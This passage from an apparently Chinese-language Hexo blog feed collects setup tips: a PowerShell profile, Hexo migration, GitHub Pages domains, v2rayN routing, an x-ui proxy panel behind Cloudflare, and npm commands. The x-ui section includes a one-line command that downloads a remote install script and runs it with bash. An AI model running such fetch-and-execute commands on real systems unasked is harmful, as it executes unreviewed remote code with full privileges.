Number = <span class="token string">'White'</span>                         Member = <span class="token string">'DarkYellow'</span>                         <span class="token function">Type</span> = <span class="token string">'DarkCyan'</span>                         Default = <span class="token string">'Gray'</span>                     <span class="token punctuation">}</span><span class="token comment"># 增量搜索，你在键入时会动态显示匹配项</span><span class="token function">Set-PSReadLineKeyHandler</span> <span class="token operator">-</span>Chord Ctrl+R <span class="token operator">-</span><span class="token keyword">Function</span> ReverseSearchHistory<span class="token comment"># 逐步搜索，每按一次快捷键会找到下一个匹配项</span><span class="token comment">#Set-PSReadLineKeyHandler -Chord 'Ctrl+r' -Function HistorySearchBackward </span><span class="token comment"># Shows navigable menu of all options when hitting Tab</span><span class="token function">Set-PSReadLineKeyHandler</span> <span class="token operator">-</span>Key Tab <span class="token operator">-</span><span class="token keyword">Function</span> Complete<span class="token comment">#Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="z"><a href="#z" class="headerlink" title="z"></a>z</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Install-Module</span> <span class="token operator">-</span>Name Z <span class="token operator">-</span>Scope CurrentUser <span class="token operator">-</span>Force <span class="token operator">-</span>SkipPublisherCheck <span class="token comment"># 安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后，使用以下命令导入 <code>z</code> 模块：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> Z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使用-Z-模块"><a href="#使用-Z-模块" class="headerlink" title="使用 Z 模块"></a>使用 Z 模块</h4><h5 id="切换到目录"><a href="#切换到目录" class="headerlink" title="切换到目录"></a>切换到目录</h5><p>使用 <code>z</code> 命令加上目录的部分名称，可以快速切换到该目录：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">z foldername<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如，假设你经常访问名为 <code>Projects</code> 的目录，你可以通过以下命令快速跳转到该目录：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">z projects<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="显示目录历史"><a href="#显示目录历史" class="headerlink" title="显示目录历史"></a>显示目录历史</h5><p>使用 <code>-l</code> 参数列出所有之前访问过的目录历史：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">z <span class="token operator">-</span>l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="posh-git"><a href="#posh-git" class="headerlink" title="posh-git"></a>posh-git</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Install-Module</span> posh-git <span class="token operator">-</span>Scope CurrentUser <span class="token operator">-</span>Force <span class="token comment"># 安装</span><span class="token function">Import-Module</span> posh-git <span class="token comment"># 导入</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>该模块管理和监视 Git 仓库的状态，进入git目录就能看到</p><h3 id="PSFzf"><a href="#PSFzf" class="headerlink" title="PSFzf"></a>PSFzf</h3><p>提供了在命令行中进行快速模糊搜索和选择的功能</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Set-PsFzfOption <span class="token parameter variable">-PSReadLineChordProvider</span> <span class="token string">'Ctrl+f'</span> <span class="token parameter variable">-PSReadLineChordReverseHistory</span> <span class="token string">'Ctrl+r'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>Set-PsFzfOption</code> 命令用于配置 <code>PSFzf</code> 模块的选项，以定制键绑定和其他行为，将 <code>Ctrl+f</code> 设置为启动模糊搜索，<code>Ctrl+r</code> 设置为反向搜索历史记录的功能，使用这个可以不用上面那个，或者换个快捷键</p><h2 id="添加别名"><a href="#添加别名" class="headerlink" title="添加别名"></a>添加别名</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Set-Alias ll <span class="token function">ls</span>Set-Alias g <span class="token function">git</span>Set-Alias <span class="token function">grep</span> findstr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我的部分别名</p><h2 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$env</span>:http_proxy<span class="token operator">=</span><span class="token string">"http://127.0.0.1:10809"</span><span class="token variable">$env</span>:puser <span class="token operator">=</span> <span class="token string">"C:\Users\xxx\Documents\PowerShell\Microsoft.PowerShell_profile.ps1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的用处是在命令行执行<code>$env:http_proxy</code>就可以改变powershell的代理端口，执行<code>cat $env:puser</code>可以查看powershell的配置文件</p><h2 id="加入配置文件"><a href="#加入配置文件" class="headerlink" title="加入配置文件"></a>加入配置文件</h2><p>执行<code>$PROFILE</code>可以得到配置文件目录，可以按目录创建文件，编辑文件，我的部分代码如下</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># Oh My Posh configuration</span>oh-my-posh init pwsh <span class="token operator">--</span>config <span class="token string">"C:\Users\xxx\AppData\Local\Programs\oh-my-posh\themes\night-owl.omp.json"</span> <span class="token punctuation">|</span> <span class="token function">Invoke-Expression</span><span class="token comment"># Import other modules</span><span class="token function">Import-Module</span> z<span class="token function">Import-Module</span> posh-git<span class="token comment">#Icons</span><span class="token function">Import-Module</span> Terminal-Icons<span class="token comment"># PSReadLine options</span><span class="token function">Import-Module</span> PSReadLine<span class="token comment"># 设置 PSReadLine 的编辑模式为 Emacs 风格</span><span class="token comment"># 禁用提示音</span><span class="token comment"># 设置历史预测源为命令历史</span><span class="token comment"># 设置预测视图样式为列表视图</span><span class="token comment"># 启用工具提示功能</span><span class="token comment"># 防止保存历史记录中的重复命令</span><span class="token function">Set-PSReadLineOption</span> <span class="token operator">-</span>EditMode Emacs `                     <span class="token operator">-</span>BellStyle None `                     <span class="token operator">-</span>PredictionSource History `                     <span class="token operator">-</span>PredictionViewStyle ListView `                     <span class="token operator">-</span>ShowToolTips `                     <span class="token operator">-</span>HistoryNoDuplicates `                     <span class="token operator">-</span>Colors @<span class="token punctuation">{</span> <span class="token comment"># 设置不同元素的颜色，如命令、参数、运算符、变量、字符串、数字、成员、类型、函数和默认颜色</span>                         Command = <span class="token string">'Cyan'</span>                         Parameter = <span class="token string">'Yellow'</span>                         Operator = <span class="token string">'Red'</span>                         Variable = <span class="token string">'Green'</span>                         String = <span class="token string">'Magenta'</span>                         Number = <span class="token string">'White'</span>                         Member = <span class="token string">'DarkYellow'</span>                         <span class="token function">Type</span> = <span class="token string">'DarkCyan'</span><span class="token comment">#                         Function = 'Blue'</span>                         Default = <span class="token string">'Gray'</span>                     <span class="token punctuation">}</span><span class="token comment"># 增量搜索，你在键入时会动态显示匹配项</span><span class="token comment">#Set-PSReadLineKeyHandler -Chord Ctrl+R -Function ReverseSearchHistory</span><span class="token comment"># 逐步搜索，每按一次快捷键会找到下一个匹配项#</span><span class="token comment">#Set-PSReadLineKeyHandler -Chord 'Ctrl+r' -Function HistorySearchBackward </span><span class="token comment"># Shows navigable menu of all options when hitting Tab</span><span class="token function">Set-PSReadLineKeyHandler</span> <span class="token operator">-</span>Key Tab <span class="token operator">-</span><span class="token keyword">Function</span> Complete<span class="token comment">#Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete</span><span class="token comment">#Utilities</span><span class="token keyword">function</span> which <span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">Get-Command</span> <span class="token operator">-</span>Name <span class="token variable">$command</span> <span class="token operator">-</span>ErrorAction SilentlyContinue <span class="token punctuation">|</span> <span class="token function">Select-Object</span> <span class="token operator">-</span>ExpandProperty Path <span class="token operator">-</span>ErrorAction SilentlyContinue<span class="token punctuation">}</span><span class="token comment">#Fzf</span><span class="token function">Import-Module</span> PSFzf<span class="token function">Set-PsFzfOption</span> <span class="token operator">-</span>PSReadLineChordProvider <span class="token string">'Ctrl+f'</span> <span class="token operator">-</span>PSReadLineChordReverseHistory <span class="token string">'Ctrl+r'</span><span class="token comment"># Alias</span><span class="token function">Set-Alias</span> ll <span class="token function">ls</span><span class="token function">Set-Alias</span> g git<span class="token function">Set-Alias</span> grep findstr<span class="token comment">#env</span><span class="token variable">$env</span>:http_proxy=<span class="token string">"http://127.0.0.1:10809"</span> <span class="token comment">#启动改变代理</span><span class="token variable">$env</span>:puser = <span class="token string">"C:\Users\xxx\Documents\PowerShell\Microsoft.PowerShell_profile.ps1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中which函数实现了linux上的函数功能，其他的前面有讲，保存，启动powershell</p><h2 id="vscode图标不显示"><a href="#vscode图标不显示" class="headerlink" title="vscode图标不显示"></a>vscode图标不显示</h2><p>更改字体为CaskaydiaCove Nerd Font Mono，改成可显示就行，右上角文件-&gt;首选项-&gt;设置，搜索<code>terminal font</code>，两个都改了吧</p><p><img src="https://images.dadream.eu.org/images/2024/08/042de8724389e36cbf3332d529f917ec.png"></p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo上传图片</title>
      <link href="/2024/06/27/hexo-shang-chuan-tu-pian/"/>
      <url>/2024/06/27/hexo-shang-chuan-tu-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo上传图片"><a href="#hexo上传图片" class="headerlink" title="hexo上传图片"></a>hexo上传图片</h1><p>我是hexo5.4.0，暂时没找到好的办法</p><p>笨办法就是放在source里的images文件夹里，使用路径<code>images/xxx.png</code></p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>githubpage添加域名</title>
      <link href="/2024/06/23/githubpage-tian-jia-yu-ming/"/>
      <url>/2024/06/23/githubpage-tian-jia-yu-ming/</url>
      
        <content type="html"><![CDATA[<h1 id="githubpage添加域名"><a href="#githubpage添加域名" class="headerlink" title="githubpage添加域名"></a>githubpage添加域名</h1><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>到域名解析商添加记录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">一条A记录 主机记录@ 你的博客IP<span class="token punctuation">(</span>ping xxx.github.io<span class="token punctuation">)</span>一条CNAME记录 主机记录www xxx.github.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="绑定github"><a href="#绑定github" class="headerlink" title="绑定github"></a>绑定github</h2><p>进入page项目的仓库，点击settings，设置Custom domain，输入自己的域名，检测通过后，到source文件夹下创建<code>CNAME.txt</code>内容为<code>你的域名</code></p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo迁移</title>
      <link href="/2024/06/23/hexo-qian-yi/"/>
      <url>/2024/06/23/hexo-qian-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo迁移"><a href="#hexo迁移" class="headerlink" title="hexo迁移"></a>hexo迁移</h1><h2 id="直接更换电脑"><a href="#直接更换电脑" class="headerlink" title="直接更换电脑"></a>直接更换电脑</h2><h3 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h3><p>安装git和node，自行搜索安装，node推荐安装在github上的nvm，方便切换版本</p><h3 id="本机与github建立连接"><a href="#本机与github建立连接" class="headerlink" title="本机与github建立连接"></a>本机与github建立连接</h3><p>设置git配置信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token string">"你的GitHub用户名"</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token string">"你的GitHub注册邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>生成ssh密钥文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token parameter variable">-C</span> <span class="token string">"你的GitHub注册邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后连续三次回车</p><p><code>c/Users/youuser/.ssh/id_rsa.pub</code>里面的内容即是双方通信的密钥</p><p>将密钥复制到github-&gt;右上角头像-&gt;settings-&gt;SSH and GPG keys，保存</p><p>本机测试连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-T</span> git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><p>创建一个文件夹用于存放博客文件，cd 进入该目录，执行命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> hexo-cli <span class="token comment">#安装hexo</span><span class="token function">npm</span> update hexo <span class="token parameter variable">-g</span> <span class="token comment">#升级hexo</span>hexo init  --no-install <span class="token comment">#初始化blog，需要先创建一个博客主文件夹，在文件夹里执行，就是上面创建的，或者</span>hexo init blog<span class="token punctuation">(</span>文件夹名<span class="token punctuation">)</span> --no-install <span class="token comment">#--no-install是阻止项目克隆下来后，自动安装依赖，不使用会自动安装最新版本hexo，具体自己影响实测</span><span class="token function">npm</span> <span class="token function">install</span> hexo@5.4.0 <span class="token comment">#安装想要的hexo版本，我的这个主题这个版本合适</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>旧电脑在博客主目录执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> list <span class="token comment"># 查看安装过的插件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>新电脑执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git <span class="token comment">#安装包名字，不加版本默认最新 </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也能把旧电脑的<code>package.json</code>文件复制到新电脑，在主目录下执行<code>npm install</code>安装插件</p><h3 id="移植文件"><a href="#移植文件" class="headerlink" title="移植文件"></a>移植文件</h3><p>将<code>source</code> <code>themes</code> <code>_config.yml</code>从旧电脑复制过来</p><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo g <span class="token comment">#生成静态文件</span>hexo s <span class="token comment">#测试网页</span>hexo d <span class="token comment">#没问题部署</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>v2rayn路由规则</title>
      <link href="/2024/01/28/v2rayn-lu-you-gui-ze/"/>
      <url>/2024/01/28/v2rayn-lu-you-gui-ze/</url>
      
        <content type="html"><![CDATA[<h1 id="v2rayn路由规则"><a href="#v2rayn路由规则" class="headerlink" title="v2rayn路由规则"></a>v2rayn路由规则</h1><p>大体可以看这篇文章<a href="https://www.v2fly.org/config/routing.html">Routing 路由 | V2Fly.org</a></p><p>本次测试所用版本为6.33</p><p>设置-&gt;路由设置-&gt;启用高级功能-&gt;高级功能-&gt;添加规则集-&gt;(随便写个别名)添加规则</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxy  <span class="token comment"># 代理的domain和IP</span>direct <span class="token comment"># 直连的</span>block <span class="token comment"># 阻塞的，一般为屏蔽广告IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>假如我想代理一些domain和IP，选择proxy，端口不写应该就是全部，写法</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">80</span><span class="token number">1</span>-1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>enabled启用，勾选保存时Domain，IP，进程名自动排序</p><p>domain写法</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">domain:完整域名keyword:域名关键字regexp:正则表达式full:完全匹配字符串geosite:域名集 <span class="token comment"># 官方网站查看</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/Loyalsoldier/v2ray-rules-dat">Loyalsoldier/v2ray-rules-dat: 🦄 🎃 👻 V2Ray 路由规则文件加强版，可代替 V2Ray 官方 geoip.dat 和 geosite.dat，兼容 Shadowsocks-windows、Xray-core、Trojan-Go、leaf 和 hysteria。Enhanced edition of V2Ray rules dat files, compatible with Xray-core, Shadowsocks-windows, Trojan-Go, leaf and hysteria. (github.com)</a></p><p>IP写法</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geoip:IP集 <span class="token comment"># 官方网站查看</span>单个IPIP段,如:192.166.23.22/23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>x-ui面板部署代理+套CF</title>
      <link href="/2024/01/28/x-ui-mian-ban-bu-shu-jie-dian-tao-cf/"/>
      <url>/2024/01/28/x-ui-mian-ban-bu-shu-jie-dian-tao-cf/</url>
      
        <content type="html"><![CDATA[<h1 id="x-ui面板部署代理-套CF"><a href="#x-ui面板部署代理-套CF" class="headerlink" title="x-ui面板部署代理+套CF"></a>x-ui面板部署代理+套CF</h1><p>项目链接<a href="https://github.com/vaxilu/x-ui">vaxilu/x-ui: 支持多协议多用户的 xray 面板 (github.com)</a></p><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h2><p>确定防火墙是否关闭，或者手动开放端口，不能不能登录面板</p><p>更新系统依赖</p><p>Ubuntu：<code>apt update -y</code>    centos  ：<code>yum update -y</code></p><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2. 安装"></a>2. 安装</h2><p>执行命令运行脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">curl</span> <span class="token parameter variable">-Ls</span> https://raw.githubusercontent.com/vaxilu/x-ui/master/install.sh<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装/更新完成后需要强制修改端口与账户密码——输入<code>y</code>按照提示输出信息</p><p>完成后进入网址<code>主机IP:你输入的端口号</code>，输入账号密码</p><p>进入主页面，选择面板设置，更改面板url根路径，更改后重启，再次进入时使用地址<code>主机IP:你输入的端口号/更改的根路径</code>，其他根据自身更改</p><h2 id="3-SSL证书申请"><a href="#3-SSL证书申请" class="headerlink" title="3. SSL证书申请"></a>3. SSL证书申请</h2><p>输入<code>x-ui</code>进入面板管理，选择16回车</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">******使用说明******该脚本将使用Acme脚本申请证书,使用时需保证:<span class="token number">1</span>.知晓Cloudflare 注册邮箱<span class="token number">2</span>.知晓Cloudflare Global API Key<span class="token number">3</span>.域名已通过Cloudflare进行解析到当前服务器<span class="token number">4</span>.该脚本申请证书默认安装路径为/root/cert目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>准备好这些东西，cloudflare直接邮箱注册<a href="https://cloudflare.com/%EF%BC%8CAPI">https://cloudflare.com/，API</a> KEY</p><p><img src="https://images.dadream.eu.org/images/2024/06/38a0e932300ad70a71f61f02d2d631b9.png"></p><p>之后依次输入</p><p><img src="https://images.dadream.eu.org/images/2024/06/be5c4f0e3840c67e1f522a704e1530ae.png"></p><p>注意输入的域名为你解析到CF上的域名，不是A记录的域名，如下图1的位置</p><p><img src="https://images.dadream.eu.org/images/2024/06/628eb2922e95e2f6f9b3e9a28233fd46.png"></p><p>之后进入面板设置</p><p><img src="https://images.dadream.eu.org/images/2024/06/a19a96035e892f12c79b7eb0450983b2.png"></p><p>将<code>/root/cert/xxx</code>填入框中，上面是cer，下面是key，之后进入cloudflare，改成这样，打开上面图2标记的小云朵，这样流量就被cf代理了</p><p><img src="https://images.dadream.eu.org/images/2024/06/92a55c17564e4c3ba2779fefa41c6d7e.png"></p><h2 id="4-创建代理"><a href="#4-创建代理" class="headerlink" title="4. 创建代理"></a>4. 创建代理</h2><p>接上面标记的那张图，将你的主机IP解析到这个域名的A记录下，名称随意填写，相当于得到了一个三级域名——<code>名称.域名</code>，例如<code>test.example.com</code></p><p>进入x-ui 面板入站列表-添加入站</p><p><img src="https://images.dadream.eu.org/images/2024/06/15cddfb0eaadb83728413babe85da1a8.png"></p><p><img src="https://images.dadream.eu.org/images/2024/06/6796d0ebb5a7dc37dd4029c7afad2d94.png"></p><p>这里的域名就是你自己解析到的域名，名称+域名，添加，分享二维码就可以使用了</p><h2 id="5-套CF优选IP"><a href="#5-套CF优选IP" class="headerlink" title="5. 套CF优选IP"></a>5. 套CF优选IP</h2><p><a href="https://github.com/badafans/better-cloudflare-ip">badafans/better-cloudflare-ip: 查找适合自己当前网络环境的优选cloudflare anycast IP (github.com)</a></p><p><a href="https://github.com/XIU2/CloudflareSpeedTest">XIU2/CloudflareSpeedTest: 🌩「自选优选 IP」测试 Cloudflare CDN 延迟和速度，获取最快 IP ！当然也支持其他 CDN / 网站 IP ~ (github.com)</a></p><p>两款工具</p><p><img src="https://images.dadream.eu.org/images/2024/06/50fe30940fc75ca875f94f0279944f66.png"></p><p>将优选得到的地址填写上去，将原来的地址写到伪装域名，需要优选443这个端口的地址</p><h2 id="6-其他类型的代理"><a href="#6-其他类型的代理" class="headerlink" title="6.其他类型的代理"></a>6.其他类型的代理</h2><p>上面也可以不用443端口，这要添加一条规则</p><p><img src="https://images.dadream.eu.org/images/2024/06/125b23e45290caf95b4d3303a39b1b53.png"></p><p>然后就可以优选443的地址，端口改写443</p><p>也能直接使用其他的端口，下面就不需要打开tls</p><p>也可以网络直接选择tcp，选择reality，这种是直连，要看你的服务器网络质量</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH连接报错</title>
      <link href="/2024/01/20/ssh-lian-jie-bao-cuo/"/>
      <url>/2024/01/20/ssh-lian-jie-bao-cuo/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH连接报错"><a href="#SSH连接报错" class="headerlink" title="SSH连接报错"></a>SSH连接报错</h1><p>当时git提交时出现连接失败等提示，试一试命令<code>ssh -T git@github.com</code>，若报错如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh: connect to <span class="token function">host</span> github.com port <span class="token number">22</span>: Connection timed out<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>则试一试<code>ssh -T -p 443 git@ssh.github.com</code>，若成功则修改<code>~/.ssh/config</code>文件，添加</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Host github.comHostname ssh.github.comPort <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再次<code>ssh -T git@github.com</code>成功，则可以进行提交，这是由于22端口处于某种原因出现了问题，之后仍然可以修改为原配置。</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用主题matery而降级hexo版本</title>
      <link href="/2024/01/20/shi-yong-zhu-ti-matery-jiang-ji-hexo-ban-ben/"/>
      <url>/2024/01/20/shi-yong-zhu-ti-matery-jiang-ji-hexo-ban-ben/</url>
      
        <content type="html"><![CDATA[<h1 id="使用主题matery而降级hexo版本"><a href="#使用主题matery而降级hexo版本" class="headerlink" title="使用主题matery而降级hexo版本"></a>使用主题matery而降级hexo版本</h1><p>遇到问题按时间顺序</p><ul><li><p>升级hexo到7.0.0后代码块显示异常</p><p>考虑hexo切换版本和升级matery版本，matery更新到创作者最新版本，hexo降级出现问题</p></li><li><p>hexo降级失败，因为node.js版本过高</p><p>降级node.js版本，使用工具nvm管理node.js版本，我使用的node.js版本为16….</p></li><li><p>hexo降级的具体过程</p><p>先删除原博客文件夹，或者改名，依次执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-cli <span class="token parameter variable">-g</span> <span class="token comment">#安装hexo大框架，用来初始化，这里全局安装是为了后面初始化使用hexo</span>hexo init  --no-install <span class="token comment">#初始化blog，需要先创建一个博客主文件夹，在文件夹里执行，或者</span>hexo init blog<span class="token punctuation">(</span>文件夹名<span class="token punctuation">)</span> --no-install <span class="token comment">#--no-install是阻止项目克隆下来后，自动安装依赖，不使用会自动安装最新版本hexo，具体自己影响实测</span><span class="token function">npm</span> <span class="token function">install</span> hexo@5.4.0 <span class="token comment">#安装想要的hexo版本，我的这个主题这个版本合适</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>hexo s后代码仍然异常</p><p>修改主目录_config.yml中的代码为</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">highlight:  enable: <span class="token boolean">false</span>  line_number: <span class="token boolean">true</span>  auto_detect: <span class="token boolean">false</span>  tab_replace: <span class="token string">''</span>  wrap: <span class="token boolean">true</span>  hljs: <span class="token boolean">false</span>prismjs:  enable: <span class="token boolean">true</span>  preprocess: <span class="token boolean">true</span>  line_number: <span class="token boolean">true</span>  tab_replace: <span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>hexo s再次执行可见已经正常，再安装以前安装的插件</p></li></ul><p>注：因为主题版本更新，我直接全删了重建的，不删修改版本的可以先卸载原来的组件如hexo，主目录下的_config.yml有点不同，需要自己注意。</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPM简介</title>
      <link href="/2024/01/20/npm-jian-jie/"/>
      <url>/2024/01/20/npm-jian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="NPM简介"><a href="#NPM简介" class="headerlink" title="NPM简介"></a>NPM简介</h1><p>NPM是随同NodeJS一起安装的包管理工具，能解决NodeJS代码部署上的很多问题</p><h2 id="NPM命令"><a href="#NPM命令" class="headerlink" title="NPM命令"></a>NPM命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> 模块名 <span class="token parameter variable">-g</span>  <span class="token comment">#全局安装，相当于加了一个环境变量，能全局调用</span><span class="token function">npm</span> <span class="token function">install</span> 模块名 <span class="token comment">#普通安装，一般安装在当前文件夹</span><span class="token function">npm</span> list <span class="token parameter variable">-g</span> <span class="token comment">#列出已安装全局模块</span><span class="token function">npm</span> list<span class="token function">npm</span> list 模块 <span class="token comment">#显示模块版本号</span><span class="token function">npm</span> uninstall 模块名 <span class="token parameter variable">-g</span>  <span class="token comment">#全局卸载</span><span class="token function">npm</span> uninstall 模块名 <span class="token comment">#普通卸载</span><span class="token function">npm</span> search 关键字 <span class="token comment">#搜索模块</span><span class="token function">npm</span> view 模块名 versions  <span class="token comment">#列出该模块所有版本</span><span class="token function">npm</span> <span class="token function">install</span> 模块名@版本号 <span class="token comment">#安装具体版本，一般只能安装一个版本</span><span class="token function">npm</span> cache clean <span class="token parameter variable">--force</span> <span class="token comment">#安装后出现问题，可以运行清理缓存，这会清除全局安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node.js版本问题</title>
      <link href="/2024/01/20/node.js-ban-ben-wen-ti/"/>
      <url>/2024/01/20/node.js-ban-ben-wen-ti/</url>
      
